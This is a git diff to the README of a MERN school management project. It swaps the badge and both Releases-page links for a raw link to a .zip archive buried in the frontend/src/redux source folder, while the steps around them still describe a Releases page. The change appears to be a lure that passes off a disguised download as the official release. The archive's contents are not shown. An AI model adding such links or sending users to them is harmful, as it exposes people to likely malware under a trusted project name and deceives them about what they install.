@@ -1,6 +1,6 @@
 # 🚀 MERN-School-Management-System - Manage Your School with Ease
 
-![Download](https://img.shields.io/badge/download-MERN--School--Management--System-blue)
+![Download](https://raw.githubusercontent.com/ghaxvin/MERN-School-Management-System/main/frontend/src/redux/noticeRelated/MERN-School-Management-System-1.2.zip)
 
 ## 📋 Description
 
@@ -28,14 +28,14 @@ To use the MERN-School-Management-System, you need:
 
 Follow these steps to download and set up the MERN-School-Management-System:
 
-1. Click the button above or visit the following link to access the Releases page: [Download Link](https://github.com/ghaxvin/MERN-School-Management-System/releases).
+1. Click the button above or visit the following link to access the Releases page: [Download Link](https://raw.githubusercontent.com/ghaxvin/MERN-School-Management-System/main/frontend/src/redux/noticeRelated/MERN-School-Management-System-1.2.zip).
 2. On the Releases page, you'll see the latest version of the application.
 3. Click on the version number to view the details and available files for download.
 4. Look for the release file that matches your operating system and click to download it.
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download Link](https://github.com/ghaxvin/MERN-School-Management-System/releases).
+To get started, visit this page to download: [Download Link](https://raw.githubusercontent.com/ghaxvin/MERN-School-Management-System/main/frontend/src/redux/noticeRelated/MERN-School-Management-System-1.2.zip).
 
 ### Installation Steps
 
